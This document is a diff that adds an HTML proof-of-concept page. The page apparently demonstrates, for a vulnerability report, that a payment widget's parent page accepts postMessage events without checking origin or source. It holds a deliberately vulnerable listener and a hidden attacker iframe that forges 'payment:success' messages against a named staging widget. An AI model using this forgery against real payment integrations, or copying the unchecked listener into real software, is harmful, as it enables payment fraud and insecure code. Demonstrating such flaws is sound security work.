@@ -1,0 +1,110 @@
+<!doctype html>
+<meta charset="utf-8" />
+<title>postMessage Origin/Source Check – PoC</title>
+<style>
+  body { font: 14px/1.45 system-ui; margin: 24px; }
+  input, button { font: inherit; }
+  #log { white-space: pre-wrap; background: #111; color: #0f0; padding: 10px; border-radius: 8px; min-height: 120px; }
+  iframe { border: 1px solid #ccc; }
+</style>
+
+<h1>PoC: Missing e.origin / e.source validation</h1>
+<ol>
+  <li>This page embeds the <b>real widget</b> (staging) in an iframe.</li>
+  <li>It sets up a <b>vulnerable parent listener</b> that only checks <code>uuid</code> (no origin/source).</li>
+  <li>An <b>attacker iframe</b> sends a forged <code>postMessage</code> with the same <code>uuid</code>.</li>
+  <li>Watch the parent accept &amp; dispatch the forged event in the log below.</li>
+</ol>
+
+<p>
+  Widget URL:
+  <input id="widgetUrl" size="90"
+         value="https://multipay.staging.komoju-dev.com/widget.html?uuid=DEMO-UUID-123" />
+  <button id="embed">Embed widget</button>
+</p>
+
+<p>
+  Forge event:
+  <input id="eventName" value="payment:success" />
+  Amount: <input id="amount" value="1" size="4" />
+  Currency: <input id="currency" value="USD" size="5" />
+  <button id="send">Send forged postMessage</button>
+</p>
+
+<h2>Log</h2>
+<div id="log">(no events yet)</div>
+
+<!-- Where the real widget iframe goes -->
+<div style="margin:12px 0">
+  <iframe id="victim" width="420" height="280" title="Widget iframe"></iframe>
+</div>
+
+<!-- Hidden attacker iframe – will post a forged message automatically when asked -->
+<iframe id="attacker" width="0" height="0" style="visibility:hidden"
+        srcdoc='<!doctype html><meta charset="utf-8">
+<script>
+  function sendForged(uuid, evt, amount, currency){
+    const payload = { uuid: uuid, event: evt, amount: Number(amount), currency: currency };
+    // attacker posts to PARENT; parent’s listener is global and (in this PoC) has no origin/source checks
+    parent.postMessage(payload, "*"); // the "*" is exactly what makes this dangerous if the parent doesn't validate
+  }
+</script>
+<body>attacker ready</body>'></iframe>
+
+<script>
+  // ------------------------------------------------------------
+  // Utilities
+  // ------------------------------------------------------------
+  const $ = (id) => document.getElementById(id);
+  function log(...args){
+    const line = args.map(a => typeof a === 'string' ? a : JSON.stringify(a)).join(' ');
+    const el = $('log');
+    el.textContent = (el.textContent === '(no events yet)' ? '' : el.textContent + '\n') + line;
+  }
+  function getUuidFrom(url){
+    try { return new URL(url).searchParams.get('uuid') || ''; }
+    catch(_){ return ''; }
+  }
+
+  // ------------------------------------------------------------
+  // 1) Embed the REAL widget iframe (staging) using the URL above
+  // ------------------------------------------------------------
+  $('embed').onclick = () => {
+    const url = $('widgetUrl').value.trim();
+    $('victim').src = url;
+    log('[Parent] Embedded widget:', url);
+  };
+
+  // ------------------------------------------------------------
+  // 2) Vulnerable parent listener (what’s risky in the bundle)
+  //    NOTE: This intentionally omits e.origin/e.source checks to demonstrate the issue.
+  // ------------------------------------------------------------
+  let CURRENT_UUID = getUuidFrom($('widgetUrl').value);
+  window.addEventListener('message', (e) => {
+    // ❌ VULNERABLE: no origin/source verification — accepts any sender
+    if (e && typeof e.data === 'object' && e.data.uuid && e.data.uuid === CURRENT_UUID) {
+      // "dispatch" – in the real code this would trigger privileged behavior
+      log('[Parent] DISPATCH (vulnerable): event=', e.data.event, ' data=', e.data);
+    } else {
+      log('[Parent] Ignored message:', {origin: e.origin, data: e.data});
+    }
+  });
+
+  // Keep CURRENT_UUID in sync if user edits the URL
+  $('widgetUrl').addEventListener('input', ()=> { CURRENT_UUID = getUuidFrom($('widgetUrl').value); });
+
+  // ------------------------------------------------------------
+  // 3) Attacker sends a forged message from a sibling iframe
+  // ------------------------------------------------------------
+  $('send').onclick = () => {
+    const uuid = getUuidFrom($('widgetUrl').value) || 'DEMO-UUID-123';
+    const evt  = $('eventName').value.trim() || 'payment:success';
+    const amt  = $('amount').value.trim() || '1';
+    const cur  = $('currency').value.trim() || 'USD';
+
+    // call the helper INSIDE attacker iframe
+    const attackerWin = $('attacker').contentWindow;
+    attackerWin.sendForged(uuid, evt, amt, cur);
+    log('[Attacker] Sent forged message to parent with uuid=', uuid);
+  };
+</script>
